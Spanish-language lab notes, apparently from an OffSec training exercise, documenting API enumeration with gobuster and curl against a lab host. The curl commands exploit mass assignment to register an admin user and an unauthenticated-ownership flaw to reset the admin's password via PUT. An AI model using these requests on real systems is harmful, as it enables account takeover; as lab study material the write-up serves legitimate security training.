# Enumeration: Mapeo basico de sitio web con gobuster y curl

## Fecha: 14/01/2025
## Host: offsecwp
## IP: 192.168.205.16

---

## Objetivo
1. Explorar **gobuster** y sus capacidades para mapear un sitio web  
2. Explorar a travez de **curl** las respuestas de las APIs y encontrar un vector de ataque para escalar privilegios.

---
## Herramientas
1. curl
2. gobuster
---
## Procedimiento y comandos
1. Paso 1: Crear archivo pattern para utilizar con **gobuster -p pattern**
	//contenido de pattern:
	{GOBUSTER}/v1
	{GOBUSTER}/v2
 V/1 y v/2 representan al patron que quermos explorar.
2. Paso 2: 
	gobuster dir -u http://192.168.205.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern 
	- se puede utilizar el parametro **-o result.txt** o **--output result.txt** 
3. Paso 3: 
	curl -i http://192.168.205.16:5002/users/v1
	- ejecuta por defecto un GET y obtenemos usuarios.
4. Paso 4: 
	gobuster dir -u http://192.168.205.16:5002/users/v1/admin -w /usr/share/wordlists/dirb/small.txt
5. Paso 5: 
	curl -i http://192.168.205.16:5002/users/v1/admin/password
	- obtenemos un error, que indica que el metodo GET no esta permitido en el endpoint
6. Paso 6: 
	curl -i http://192.168.205.16:5002/users/v1/login
	- obtenemos un error, que indica "User not found"
7. Paso 7: 
	curl \ 
	-d '{"password":"fake","username":"admin"}'\
	 -H 'Content-Type: application/json' \ 
	http://192.168.205.16:5002/users/v1/login
	- obtenemos un error, indicando que la contrasena es incorrecta, lo cual nos dice que el body es correcto.
	- **{ "status": "fail", "message": "Password is not correct for the given username."} **
8. Paso 8: 
	curl \
	 -d '{"password":"lab","username":"offsecadmin"}'\
	 -H 'Content-Type: application/json' \
	 http://192.168.205.16:5002/users/v1/register
	- Intentamos registrar un usuario, pero obtenemos un error 400 Bad Request, ya que necesitamos el campo email en el body.
	- **{ "status": "fail", "message": "'email' is a required property"}**
9. Paso 9: 
	 curl \ 
	-d '{"password":"baduserpass123","username":"baduser","email":"mybaduser@baduser.com","admin":"True"}' \
	-H 'Content-Type: application/json' \
	 http://192.168.205.16:5002/users/v1/register 
	 - Registramos un usuario con rol:admin y podemos generar un lgoin con un usuario legitimo
10. Paso 10: 
	 curl \
	 -d '{"password":"lab","username":"offsec"}'\
	 -H 'Content-Type: application/json' \
	 http://192.168.205.16:5002/users/v1/login
	- Generamos un login exitoso y obtenemos un token de autenticacion.
11. Paso 11: 
	  curl \
  	  http://192.168.205.16:5002/users/v1/admin/password \ 
  	  -H 'Content-Type: application/json' \
  	  -H 'Authorization: OAuth token-de-respuesta-en-login' \
  	  -d '{"password": "pwned"}'
         - curl de prueba, con el objetivo de obtener una respuesta que indique por medio del error, 
         - cual es la direccion correcta, para modificar datos de otros usuarios
         - obtenemos un error indicando que el metodo en este caso GET no esta permitido
12. Paso 12: 
	curl -X 'PUT' \
  	 http://192.168.205.16:5002/users/v1/admin/password \
        -H 'Content-Type: application/json' \
        -H 'Authorization: OAuth token-usuario-legitimo-generado-en-paso-9'\
        -d '{"password": "pass123"}'
	Modificar metodo a PUT y generar el cambio de password proporcionando token de usuario legitimo en headers

13. (Paso opcional): 
	se puede registrar un usuario sin rol:admin repitiendo el paso 9 pero obviando el campo admin:True y 
	generar el login para obtener un token y
	modificar de todas formas las credenciales de otro, inclusive el las del usuario admin.
---
## Troubleshooting

---

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

